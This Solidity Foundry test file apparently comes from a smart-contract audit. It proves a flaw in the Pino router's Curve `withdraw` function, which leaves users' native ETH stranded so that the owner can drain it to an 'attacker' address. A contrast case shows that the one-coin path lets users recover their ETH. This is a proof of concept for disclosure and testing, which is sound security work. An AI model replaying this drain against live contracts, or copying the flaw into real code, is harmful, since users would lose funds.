// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import {Test} from "forge-std/Test.sol";
import {Curve} from "../src/pino/protocols/v2/Curve.sol";
import {ICurvePool} from "../src/pino/interfaces/Curve/ICurvePool.sol";
import {MockCurveEthPool, MockERC20, MockWETH9} from "../src/mocks/MockVenue.sol";

/// @title Pino C-01 — `Curve::withdraw` strands users' native ETH
/// @notice Real audited source: nitolabs/pino-contract @ e11214c8 (protocols/v2/Curve.sol).
///         `withdraw` calls Curve `remove_liquidity`, which for an ETH pool returns NATIVE ETH
///         to the Pino router, but — unlike `withdrawOneCoinI/U` — never wraps it to WETH. The
///         router exposes no ETH sweep for users (only `sweepToken` for ERC20 and `unwrapWETH9`
///         for WETH), so the ETH is stranded and only the `owner` can take it via `withdrawAdmin`.
contract Pino_Curve_Withdraw_StrandsETH is Test {
    Curve internal router; // real Pino Curve proxy; deployer (this) is the owner
    MockCurveEthPool internal pool; // opaque external Curve-style ETH pool
    MockERC20 internal steth; // pool coin1
    MockWETH9 internal weth;

    address internal user = makeAddr("user");
    address internal attacker = makeAddr("attacker"); // beneficiary of the owner drain

    uint256 internal constant ONE_ETH = 1 ether;

    function setUp() public {
        weth = new MockWETH9();
        steth = new MockERC20("Staked ETH", "stETH");
        pool = new MockCurveEthPool(steth);
        // owner of the router == address(this) (the deployer), per Ownable2Step
        router = new Curve(address(0xDEAD), address(weth));
    }

    /// @dev Establish the real withdrawal precondition: the router holds LP for the user's
    ///      position. Achieved via the real `deposit` path (router calls pool.add_liquidity,
    ///      so LP is minted to the router), exactly as in production before a withdraw.
    function _userDepositsOneEth() internal {
        vm.deal(user, ONE_ETH);
        uint256[2] memory amounts = [ONE_ETH, uint256(0)]; // [ETH, stETH]
        vm.prank(user);
        router.deposit{value: ONE_ETH}(amounts, 0, ICurvePool(address(pool)), 0);
        // LP now sits in the router; user has spent their 1 ETH into the position
        assertEq(pool.balanceOf(address(router)), ONE_ETH, "router should hold LP");
        assertEq(user.balance, 0, "user spent 1 ETH into the position");
    }

    function test_27249_withdraw_strands_user_eth() public {
        _userDepositsOneEth();

        uint256[2] memory minAmounts = [uint256(0), uint256(0)];

        // === Exploit: user withdraws their liquidity through the real vulnerable function ===
        vm.prank(user);
        router.withdraw(ONE_ETH, minAmounts, ICurvePool(address(pool)));

        // remove_liquidity returned 1 ETH as NATIVE ETH to the router, and `withdraw` did NOT
        // wrap it -> it is stuck as the router's raw ETH balance.
        assertEq(address(router).balance, ONE_ETH, "1 ETH stranded in router");
        assertEq(weth.balanceOf(address(router)), 0, "withdraw did not wrap ETH to WETH");

        // === User has no way to reclaim the ETH ===
        // The only user-facing exits are sweepToken (ERC20) and unwrapWETH9 (WETH). The router
        // holds 0 WETH, so unwrapWETH9 returns nothing. There is no sweepETH.
        vm.prank(user);
        router.unwrapWETH9(user);
        assertEq(user.balance, 0, "user recovered ZERO ETH from the withdrawal");
        assertEq(address(router).balance, ONE_ETH, "ETH still stuck after unwrap attempt");

        // === Concrete harm: owner captures the stranded ETH for a third party ===
        // (this contract is the router owner)
        uint256 attackerBefore = attacker.balance;
        router.withdrawAdmin(attacker);
        assertEq(attacker.balance - attackerBefore, ONE_ETH, "attacker/owner gains the user's 1 ETH");
        assertEq(address(router).balance, 0, "router drained by owner");

        // Net settlement: user deposited 1 ETH, recovered 0, the owner/attacker took 1 ETH.
        assertEq(user.balance, 0, "user permanently lost 1 ETH");
    }

    /// @notice Contrast: the SAME pool ETH is fully recoverable via `withdrawOneCoinU`, which
    ///         wraps the received ETH to WETH — proving the loss is specific to `withdraw`.
    function test_27249_withdrawOneCoin_wraps_and_is_recoverable() public {
        _userDepositsOneEth();

        vm.prank(user);
        router.withdrawOneCoinU(ONE_ETH, 0, 0, ICurvePool(address(pool)));

        // withdrawOneCoinU wrapped the native ETH into WETH held by the router
        assertEq(weth.balanceOf(address(router)), ONE_ETH, "one-coin path wraps ETH to WETH");
        assertEq(address(router).balance, 0, "no raw ETH stranded on the one-coin path");

        // User can now reclaim it
        vm.prank(user);
        router.unwrapWETH9(user);
        assertEq(user.balance, ONE_ETH, "user fully recovers 1 ETH on the one-coin path");
    }
}
